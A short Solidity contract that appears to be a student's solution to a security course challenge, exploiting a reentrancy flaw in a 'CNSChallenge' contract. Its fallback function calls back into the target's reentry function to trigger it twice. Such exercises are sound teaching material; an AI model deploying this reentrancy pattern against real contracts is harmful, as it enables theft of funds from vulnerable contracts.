pragma solidity ^0.4.22;

import "./CNSChallenge.sol";

contract CNSReentry {
    uint count = 1;
    string id;
    CNSChallenge challenge;

    constructor(address _address) public {
        challenge = CNSChallenge(_address);
    }
   
    function attack(string studentID) public {
        id = studentID;
        challenge.reentry(id);
    }

    function () external payable {
        if (count < 2) {
            count += 1;
            challenge.reentry(id);
        }
    }
}